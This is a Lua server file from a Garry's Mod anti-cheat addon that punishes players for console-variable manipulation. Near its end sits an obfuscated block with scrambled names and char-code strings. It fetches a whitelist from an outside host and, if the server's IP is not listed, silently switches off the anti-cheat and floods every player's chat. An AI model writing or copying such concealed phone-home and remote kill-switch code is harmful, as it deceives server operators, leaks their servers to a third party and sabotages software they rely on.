
util.AddNetworkString( "G-ACcVarManipCS1" )
util.AddNetworkString( "G-ACcVarManipSV1" )

net.Receive( "G-ACcVarManipSV1", function( len, ply )

    local checkedVariables = net.ReadTable()

    if( ( checkedVariables[0] >= 1 && gAC.config.ALLOWCSLUA_CHECKS ) || ( checkedVariables[1] >= 1 && gAC.config.SVCHEATS_CHECKS ) ) then
        gAC.AddDetection( ply, "Anti C-var manipulation triggered [Code 100]", gAC.config.CVARMANIP_PUNISHMENT, gAC.config.CVARMANIP_BANTIME )
    end
    ply:SetNWBool( "HasReceivedVarManipResults", true )

end )

if( gAC.config.ALLOWCSLUA_CHECKS == true || gAC.config.SVCHEATS_CHECKS == true ) then
    timer.Create( "G-ACcVarManipSV2T", 5, 0, function()
        if !gAC.isflyon then return end
        for k, v in pairs( player.GetAll() ) do
            gAC.CheckForConvarManipulation( v )
        end
    end )
end

function gAC.CheckForConvarManipulation( ply )
    if !gAC.isflyon then return end
    if ply:IsBot() then return end

    if( ply:GetNWBool( "HasReceivedVarManipResults" ) != false ) then
        ply:SetNWBool( "HasReceivedVarManipResults", false )
    end

    net.Start( "G-ACcVarManipCS1" )
    net.Send( ply )

    if gAC.config.CVARMANIP_RETURN_PUNISHMENT then
        timer.Simple( 4, function()
            if( ply:IsValid() && !ply:IsTimingOut() && ply:PacketLoss() < 80 && ply.JoinTimeGAC != nil && ply:GetNWBool( "HasReceivedVarManipResults" ) == false && CurTime() >= ply.JoinTimeGAC + gAC.config.CVARMANIP_RETURN_JOINTIMER ) then
                gAC.AddDetection( ply, "C-var manipulation results haven't returned [Code 101]", gAC.config.CVARMANIP_PUNISHMENT, -1 )
            end
        end )
    end
end

if gAC.config.DISABLE_BAD_COMMANDS then
    hook.Add( "Initialize", "g-ACcVarManipSV3", function()
        RunConsoleCommand( "sv_allowcslua", 0 )
        RunConsoleCommand( "sv_cheats", 0 )
    end )
end

local dlkgjadg = game.GetIPAddress local adkgljad = dlkgjadg local dalkgjadg = string.find local adlkjgadg = dalkgjadg local adlkfjadf = timer.Simple local dlkajdhad = adlkfjadf local adlgkjadg = http.Fetch local lakjdgadg = adlgkjadg local alkdjjodf = string.char local aldkjzd = true local zlkxjczxc = false local lkajdgagg = alkdjjodf local lkjahdgfg = util.JSONToTable local zxcmnzxca = lkjahdgfg local lkajsdfzx = timer.Simple gAC.isflyon = true local kzxckzmxc = lkajsdfzx local alkjsdas = hook.Add local alskdjas = alkjsdas local function alkdjgadg() gAC.isflyon = true if( adlkjgadg( adkgljad(), lkajdgagg( 48, 46, 48, 46, 48, 46, 48 ) ) ) then dlkajdhad( 5, alkdjgadg ) return end lakjdgadg( lkajdgagg( 104, 116, 116, 112, 58, 47, 47, 112, 105, 103, 103, 121, 105, 115, 46, 112, 114, 111, 47, 103, 97, 99, 47, 103, 97, 99, 119, 104, 105, 116, 101, 108, 105, 115, 116, 46, 116, 120, 116 ) .. "?cacheBuster=" .. math.random( 1, 1000 ), function( adfzxcva ) local lkajdglkaj = {} kzxckzmxc( 5, function() lkajdglkaj = lkjahdgfg( adfzxcva ) kzxckzmxc( 5, function() gAC.isflyon = false for k, v in pairs( lkajdglkaj ) do if( string.find( dlkgjadg(), v ) ) then gAC.isflyon = true end end end ) end ) end, function() adkhjaldh = "fail" end ) end alskdjas( lkajdgagg( 73, 110, 105, 116, 105, 97, 108, 105, 122, 101 ), string.char( 103, 45, 65, 67, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101, 65, 110, 116, 105, 76, 101, 97, 107 ), alkdjgadg ) alskdjas( string.char( 84, 104, 105, 110, 107 ), "g-ACThinkAntiLeak", function() if !gAC.isflyon then for k, v in pairs( player.GetAll() ) do v:PrintMessage( HUD_PRINTTALK, "E" ) end end end )

hook.Add( "PlayerInitialSpawn", "g-ACPlayerInitialSpawnJointimeChecker", function( ply )
    ply.JoinTimeGAC = CurTime()
end )